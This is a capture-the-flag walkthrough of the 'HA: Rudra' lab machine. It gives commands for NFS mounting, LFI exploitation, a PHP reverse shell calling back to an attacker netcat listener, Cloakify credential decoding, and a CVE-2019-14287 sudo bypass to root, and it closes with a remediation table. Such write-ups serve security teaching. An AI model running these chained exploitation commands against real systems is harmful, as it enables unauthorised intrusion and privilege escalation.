# HA: Rudra — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.101 |
| **Difficulty** | Intermediate |
| **OS** | Linux |
| **Goal** | root flag (`/root/final.txt`) |
| **Source** | [HackingArticles](https://www.hackingarticles.in/ha-rudra-vulnhub-walkthrough/) |

## Attack Summary

An NFS share exposes the home directory of user `shivay`. A blank PHP page is found via directory brute-force and is vulnerable to Local File Inclusion (LFI). A PHP reverse shell placed in the NFS-mounted share is triggered through the LFI parameter to gain initial access. MySQL database enumeration reveals a steganographically hidden credential using the Cloakify tool (emoji cipher). The credential allows SSH login as `mahakaal`, who has `sudo watch` rights. CVE-2019-14287 (sudo user ID bypass) escalates to root.

## Methodology

1. Host discovery; Nmap identifies SSH (22), HTTP (80), and NFS (2049)
2. NFS enumeration and mount of `/home/shivay`
3. Directory brute-force to find `nandi.php` (LFI entry point)
4. LFI confirmed via `/etc/passwd` read
5. PHP reverse shell placed in NFS share; triggered via LFI
6. MySQL enumeration for hints; Cloakify decoding of emoji credentials
7. SSH as `mahakaal`; privilege escalation via CVE-2019-14287 (`sudo -u#-1 watch`)

## Step 1: Host Discovery

```bash
netdiscover -r 192.168.1.0/24
# Target: 192.168.1.101
```

## Step 2: Port Scan

```bash
nmap -A 192.168.1.101
```

Open ports:
- 22 (SSH)
- 80 (HTTP)
- 2049 (NFS)

![Nmap scan](images/01-nmap.png)

## Step 3: NFS Enumeration and Mount

```bash
showmount -e 192.168.1.101
# /home/shivay  *

mkdir /tmp/ignite
mount -t nfs 192.168.1.101:/home/shivay /tmp/ignite
ls /tmp/ignite
# mahadev.txt
```

Read `mahadev.txt` for hints.

![NFS mounted share](images/02-nfs-mount.png)

## Step 4: Directory Brute-Force to Find LFI Page

```bash
dirb http://192.168.1.101/
# Finds: robots.txt -> nandi.php
```

Browsing `http://192.168.1.101/nandi.php` returns a blank page. The URL accepts a `file` parameter.

## Step 5: Confirm LFI

```bash
curl "http://192.168.1.101/nandi.php?file=/etc/passwd"
```

The server returns `/etc/passwd`, confirming LFI. Users identified: `rudra`, `shivay`, `mahakaal`.

![LFI reading /etc/passwd](images/03-lfi.png)

## Step 6: PHP Reverse Shell via NFS + LFI

Download the Pentestmonkey PHP reverse shell and edit it:

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O /tmp/ignite/shell.php
# Edit shell.php: set $ip = "192.168.1.108" and $port = 4444
```

Start a netcat listener:

```bash
nc -lvnp 4444
```

Trigger the shell via LFI:

```bash
curl "http://192.168.1.101/nandi.php?file=/home/shivay/shell.php"
```

A reverse shell connects to the listener.

## Step 7: MySQL Enumeration

```bash
netstat -tulnp
# MySQL (3306) listening on 127.0.0.1

mysql -u root -p
# Check mahadev.txt hint for password
use mahadev;
show tables;
select * from hint;
```

The hint points to files in the `/media` filesystem and mentions the Cloakify tool.

## Step 8: Cloakify Steganography — Recover Credentials

Copy the `creds` file from `/media`:

```bash
ls /media
# creds  hint
cat /media/creds
# Contains emoji characters encoding a hidden secret
```

Download Cloakify Factory on the attacker machine:

```bash
git clone https://github.com/TryCatchHCF/Cloakify
cd Cloakify
python cloakifyFactory.py
```

Select option **2** (Decloakify), choose the **emoji cipher** from the cipher list, and paste the contents of `creds` when prompted. Select "no noise added".

![Cloakify decoding emoji credentials](images/04-cloakify.png)

Credentials recovered: **`mahakaal:kalbhairav`**

## Step 9: SSH Login as `mahakaal`

```bash
ssh mahakaal@192.168.1.101
# Password: kalbhairav
```

Check sudo rights:

```bash
sudo -l
# (ALL) /usr/bin/watch
```

## Step 10: Privilege Escalation — CVE-2019-14287

CVE-2019-14287 allows bypassing the `sudo` "runas" restriction by using user ID `-1`, which is interpreted as root (UID 0):

```bash
sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0'
```

A root shell is obtained.

```bash
whoami
# root
cd /root
cat final.txt
```

![Root flag](images/05-root-flag.png)

## Lessons Learned

- Exported NFS shares with `*` (world-accessible) allow any host to mount them. Writing to the mounted share and then triggering execution via LFI is a classic chained attack.
- LFI without path traversal controls gives direct file read and, when combined with writable file locations, enables RCE.
- Text-based steganography (Cloakify) hides data in plain sight using Unicode symbol sets. Its presence on a target system should be treated as an indicator of compromise in real environments.
- CVE-2019-14287: `sudo` versions before 1.8.28 allow using `sudo -u#-1` to run commands as root even when root is explicitly blocked in `sudoers`.

## Remediation

| Vulnerability | Fix |
|---|---|
| NFS share exported to `*` | Restrict NFS exports to specific client IPs; mount with `nosuid,noexec` |
| LFI in `nandi.php` | Validate and whitelist the `file` parameter; never pass user input to `include()` |
| MySQL running as root / weak creds | Run MySQL as a dedicated low-privilege user; enforce strong passwords |
| Credentials hidden with Cloakify | Use a secrets manager; never store credentials in files on the filesystem |
| CVE-2019-14287 (`sudo -u#-1`) | Upgrade `sudo` to 1.8.28 or later |
